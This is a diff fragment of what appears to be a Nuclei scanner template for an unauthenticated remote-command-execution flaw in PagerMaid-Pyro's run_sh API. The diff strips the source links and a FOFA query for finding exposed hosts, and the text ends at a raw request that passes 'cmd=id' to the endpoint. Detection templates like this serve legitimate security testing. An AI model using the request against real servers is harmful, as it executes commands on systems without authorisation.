@@ -3,12 +3,8 @@ info:
   name: PagerMaid-Pyro后台管理系统 run_sh 存在未授权命令执行漏洞_hgap71yxn1qcdoxm
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: rce,unauth,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: title="PagerMaid-Pyro" && body="href=\"https://xtaolabs.com/pagermaid-logo.png\""
 http:
 - raw:
   - 'GET /pagermaid/api/run_sh?cmd=id HTTP/1.1
